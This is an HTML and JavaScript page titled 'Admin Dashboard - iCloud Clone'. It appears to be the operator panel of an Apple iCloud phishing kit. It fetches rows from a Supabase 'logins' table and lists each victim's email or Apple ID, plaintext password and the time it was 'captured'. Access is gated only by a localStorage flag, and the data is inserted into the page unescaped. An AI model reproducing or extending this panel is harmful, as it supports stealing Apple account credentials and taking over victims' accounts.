<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - iCloud Clone</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root {
            --apple-blue: #0071e3;
            --bg-color: #f5f5f7;
            --text-primary: #1d1d1f;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            padding: 40px;
        }
        .admin-card {
            background: white;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
        }
        h1 {
            font-weight: 600;
            font-size: 28px;
            margin-bottom: 30px;
            color: #000;
        }
        .table {
            margin-top: 20px;
        }
        .table thead th {
            border-top: none;
            color: #86868b;
            font-weight: 500;
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 0.05em;
        }
        .badge-date {
            font-size: 12px;
            color: #86868b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="admin-card">
            <div class="d-flex justify-content-between align-items-center">
                <h1>Logged In Users</h1>
                <div class="d-flex gap-2">
                    <button class="btn btn-outline-secondary" onclick="logout()">Logout</button>
                    <button class="btn btn-primary" onclick="fetchUsers()">Refresh Data</button>
                </div>
            </div>
            
            <div class="table-responsive">
                <table class="table align-middle">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Email / Apple ID</th>
                            <th>Password</th>
                            <th>Captured At</th>
                        </tr>
                    </thead>
                    <tbody id="userTableBody">
                        <!-- Data will be inserted here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script type="module">
        import { createClient } from '@supabase/supabase-js';

        const supabase = createClient(
            import.meta.env.VITE_SUPABASE_URL,
            import.meta.env.VITE_SUPABASE_ANON_KEY
        );

        // Security Check
        if (localStorage.getItem('isAdminLoggedIn') !== 'true') {
            window.location.href = '/admin-login.html';
        }

        window.fetchUsers = async function() {
            try {
                const { data: users, error } = await supabase
                    .from('logins')
                    .select('*')
                    .order('created_at', { ascending: false });

                if (error) throw error;

                const tbody = document.getElementById('userTableBody');
                tbody.innerHTML = '';

                users.forEach(user => {
                    const row = `
                        <tr>
                            <td>${user.id}</td>
                            <td><strong>${user.email}</strong></td>
                            <td><code>${user.password}</code></td>
                            <td><span class="badge-date">${new Date(user.created_at).toLocaleString()}</span></td>
                        </tr>
                    `;
                    tbody.insertAdjacentHTML('beforeend', row);
                });
            } catch (err) {
                console.error('Error fetching users:', err);
            }
        }

        window.logout = function() {
            localStorage.removeItem('isAdminLoggedIn');
            window.location.href = '/admin-login.html';
        }

        // Fetch on load
        fetchUsers();
    </script>


</body>
</html>
